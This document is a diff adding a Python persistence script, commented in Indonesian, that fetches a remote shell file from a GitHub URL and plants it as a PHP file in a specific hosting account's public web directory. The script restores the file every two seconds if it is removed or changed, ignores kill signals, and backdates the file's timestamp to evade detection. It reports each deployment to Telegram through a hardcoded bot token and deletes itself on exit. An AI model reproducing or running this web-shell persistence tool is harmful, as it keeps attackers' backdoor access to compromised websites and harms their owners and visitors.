@@ -1,0 +1,259 @@
+#!/usr/bin/env python3
+import os
+import time
+import sys
+import signal
+import urllib.request
+import subprocess
+import hashlib
+from datetime import datetime
+
+# ---------------- CONFIG ----------------
+CONFIG = {
+    "RAW_SHELL_URL": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/hapus23.txt",
+    "BOT_TOKEN": os.getenv("BOT_TOKEN", "8559074485:AAGMwVw5bm-RNvckM4_F5vbU0Gijy7FKtwo"),
+    "CHAT_ID": os.getenv("CHAT_ID", "-1003217853706"),
+    "TARGET_DIR": "/mnt/BLOCKSTORAGE/home/229160.cloudwaysapps.com/erwfufpvdy/public_html/public",
+    "FILE_NAME": "jtest1.php",
+    "TIMESTAMP": "202401171507.50",
+    "TIMEOUT": 10,
+    "POLL_INTERVAL": 2,
+    "REDEPLOY_COOLDOWN": 10
+}
+# ----------------------------------------
+
+# Simplified paths
+TARGET_DIR = os.path.abspath(CONFIG["TARGET_DIR"])
+FILE_PATH = os.path.join(TARGET_DIR, CONFIG["FILE_NAME"])
+SCRIPT_PATH = os.path.abspath(__file__)
+
+# State kept in memory (no temporary files)
+current_deployed_hash = None
+last_deploy_time = 0
+
+# Try to be polite on system priority (best-effort)
+def ignore_signal(signum, frame):
+    pass
+
+for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT, signal.SIGTSTP]:
+    try:
+        signal.signal(sig, ignore_signal)
+    except:
+        pass
+
+try:
+    os.nice(19)
+except Exception:
+    pass
+
+def kirim_telegram(message: str):
+    """Kirim notifikasi ke Telegram (silent-fail)."""
+    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/sendMessage"
+    data = urllib.parse.urlencode({
+        "chat_id": CONFIG["CHAT_ID"],
+        "parse_mode": "Markdown",
+        "text": message
+    }).encode('ascii')
+    try:
+        req = urllib.request.Request(url, data=data, method='POST')
+        urllib.request.urlopen(req, timeout=CONFIG["TIMEOUT"])
+    except Exception:
+        pass
+
+def compute_hash_bytes(b: bytes) -> str:
+    return hashlib.sha256(b).hexdigest()
+
+def read_local_file_hash(path: str):
+    """Baca hash file lokal jika ada, None jika tidak bisa dibaca."""
+    try:
+        with open(path, 'rb') as f:
+            return hashlib.sha256(f.read()).hexdigest()
+    except Exception:
+        return None
+
+def ensure_target_dir():
+    """Buat folder target jika belum ada, dengan permission aman."""
+    try:
+        os.makedirs(TARGET_DIR, exist_ok=True)
+        # pastikan dapat ditulis dulu (owner default), nanti file akan diubah permission jadi read-only
+        return True
+    except Exception:
+        return False
+
+def download_content_in_memory():
+    """
+    Download konten ke memory (bytes). Gunakan urllib dulu, fallback ke curl stdout.
+    Kembalikan None jika gagal.
+    """
+    url = CONFIG["RAW_SHELL_URL"]
+    try:
+        with urllib.request.urlopen(url, timeout=CONFIG["TIMEOUT"]) as resp:
+            content = resp.read()
+            if len(content) == 0:
+                raise RuntimeError("Empty content from urllib")
+            return content
+    except Exception:
+        # fallback to curl
+        try:
+            r = subprocess.run(["curl", "-s", url], capture_output=True, timeout=CONFIG["TIMEOUT"])
+            if r.returncode == 0 and r.stdout:
+                return r.stdout
+        except Exception:
+            pass
+    return None
+
+def write_bytes_atomically(path: str, b: bytes):
+    """
+    Tulis bytes ke path. Kita tidak pakai temporary file untuk perbandingan,
+    tapi menulis langsung (karena sudah dibandingkan di memori).
+    """
+    try:
+        with open(path, 'wb') as f:
+            f.write(b)
+        # set permission read-only for all (owner/group/other) agar sulit diubah
+        os.chmod(path, 0o755)
+        return True
+    except Exception:
+        return False
+
+def parse_config_timestamp(ts_str: str):
+    """
+    Mencoba parse beberapa format umum; default fallback ke now.
+    Wanted format in user's original was e.g. "202511111531.12".
+    We'll try to parse that first: YYYYMMDDHHMM.SS
+    """
+    try:
+        if "." in ts_str:
+            main, frac = ts_str.split(".", 1)
+            # main like YYYYMMDDHHMM
+            if len(main) == 12:
+                dt = datetime.strptime(main + frac.zfill(2), "%Y%m%d%H%M%S")
+                return dt
+        # try common ISO-ish
+        try:
+            return datetime.fromisoformat(ts_str)
+        except Exception:
+            pass
+    except Exception:
+        pass
+    # fallback: current time
+    return datetime.now()
+
+def touch_set_mtime(path: str, dt: datetime):
+    """Set mtime dan atime file ke datetime dt (float timestamp)."""
+    try:
+        ts = dt.timestamp()
+        os.utime(path, (ts, ts))
+    except Exception:
+        pass
+
+def deploy_if_needed():
+    """
+    Hati-hati: hanya deploy jika:
+      - file lokal tidak ada (dihapus)
+      - atau file lokal hash != remote hash (diubah oleh hacker)
+    Bandingkan semuanya di-memory untuk menghindari file temporary pada disk.
+    """
+    global current_deployed_hash, last_deploy_time
+
+    # pastikan folder ada
+    if not ensure_target_dir():
+        return False
+
+    # baca local hash (file yang currently on disk)
+    local_hash = read_local_file_hash(FILE_PATH)
+
+    # ambil remote content (in memory)
+    remote_bytes = download_content_in_memory()
+    if remote_bytes is None:
+        # gagal download; jangan spam -> exit
+        return False
+
+    remote_hash = compute_hash_bytes(remote_bytes)
+
+    # jika belum pernah deploy sebelumnya, set current_deployed_hash dari file jika ada
+    if current_deployed_hash is None:
+        current_deployed_hash = local_hash
+
+    # Kondisi deploy:
+    # 1) file lokal tidak ada (local_hash is None) -> deploy
+    # 2) file lokal ada tapi hash berbeda dari remote -> deploy
+    # Jika file lokal hash sama dengan remote -> tidak perlu deploy
+    need_deploy = False
+    if local_hash is None:
+        need_deploy = True
+    elif local_hash != remote_hash:
+        need_deploy = True
+    else:
+        need_deploy = False
+
+    # tambahan safety: jika kita baru saja men-deploy (cooldown), jangan redeploy
+    now = time.time()
+    if need_deploy and (now - last_deploy_time) < CONFIG["REDEPLOY_COOLDOWN"]:
+        # sudah deploy baru-baru ini, abaikan untuk menghindari spamming
+        need_deploy = False
+
+    if not need_deploy:
+        # update in-memory stored hash to reflect current local (if local exists)
+        current_deployed_hash = local_hash
+        return False
+
+    # Tulis file (sudah dibandingkan di memori -> aman)
+    ok = write_bytes_atomically(FILE_PATH, remote_bytes)
+    if not ok:
+        return False
+
+    # set mtime dari CONFIG["TIMESTAMP"] (user requested)
+    dt = parse_config_timestamp(CONFIG.get("TIMESTAMP", ""))
+    touch_set_mtime(FILE_PATH, dt)
+
+    # update state
+    current_deployed_hash = remote_hash
+    last_deploy_time = now
+
+    # kirim notif
+    relative = os.path.relpath(FILE_PATH, start=os.getcwd()).replace(os.sep, "/")
+    url = f"{os.getenv('DOMAIN', 'https://parasitetesting.com').rstrip('/')}/{relative.lstrip('/')}"
+    ts_for_msg = CONFIG.get("TIMESTAMP", "")
+    try:
+        kirim_telegram(
+            f"✅ *LP berhasil dideploy!*\n"
+            f"📁 Path: `{FILE_PATH}`\n"
+            f"🌍 URL: `{url}`\n"
+            f"🕒 Waktu: {ts_for_msg}"
+        )
+    except Exception:
+        pass
+
+    return True
+
+def main():
+    # domain arg optional (dipakai untuk URL di notifikasi); tetap aman jika tidak ada
+    domain_arg = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else None
+    if domain_arg:
+        os.environ['DOMAIN'] = domain_arg
+
+    # ensure directory exist before any action
+    ensure_target_dir()
+
+    # load initial local hash into memory to avoid unnecessary redeploy
+    global current_deployed_hash
+    current_deployed_hash = read_local_file_hash(FILE_PATH)
+
+    # Immediately attempt deploy if missing or different
+    deploy_if_needed()
+
+    # Loop: cek berkala, hanya mendownload metadata/content dan deploy jika perlu
+    try:
+        while True:
+            deploy_if_needed()
+            time.sleep(CONFIG["POLL_INTERVAL"])
+    except KeyboardInterrupt:
+        # jangan tinggalkan jejak (opsional) -- best-effort remove process itself
+        try:
+            os.remove(SCRIPT_PATH)
+        except Exception:
+            pass
+
+if __name__ == "__main__":
+    main()
